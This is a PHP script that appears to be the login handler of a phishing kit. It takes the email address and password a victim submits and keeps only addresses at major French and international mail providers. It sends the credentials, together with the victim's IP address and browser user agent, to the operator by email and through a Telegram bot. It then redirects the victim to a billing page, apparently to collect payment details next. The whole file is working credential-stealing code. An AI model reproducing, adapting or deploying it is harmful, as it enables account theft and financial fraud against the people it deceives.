<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");




if(isset($_POST['bat_login_submit'])){

	start_session();

	gather_login_infos();


	if(is_numeric($_SESSION['email']) || strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr")){


				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[🎇] Login [🎇]

🎇 E-Mail : ".$_SESSION['email']."
🎇 Mot de passe : ".$_SESSION['password']."

[🎆] Additionnal [🎆] 

🎆 Adresse IP : ".$_SESSION['ip']."
🎆 User Agent : ".$_SESSION['useragent']."


					";

					$subject = "[🎇] + 1 Login ".$_SESSION['email']." - ".$_SESSION['ip'];
					$headers = "From: PlatiGold ⚡️ <platigold@teleg.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[🎇] Login [🎇]

🎇 E-Mail : '.$_SESSION['email'].'
🎇 Mot de passe : '.$_SESSION['password'].'

[🎆] Additionnal [🎆] 

🎆 Adresse IP :  '.$_SESSION['ip'].'
🎆 User Agent :  '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

				header('Location: ../steps/billing.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>